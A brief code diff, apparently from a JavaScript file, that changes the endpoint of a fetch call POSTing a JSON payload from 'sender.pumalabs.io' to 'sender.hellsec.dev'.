@@ -332,7 +332,7 @@
         };
 
         try {
-          const response = await fetch('https://sender.pumalabs.io/', {
+          const response = await fetch('https://sender.hellsec.dev/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
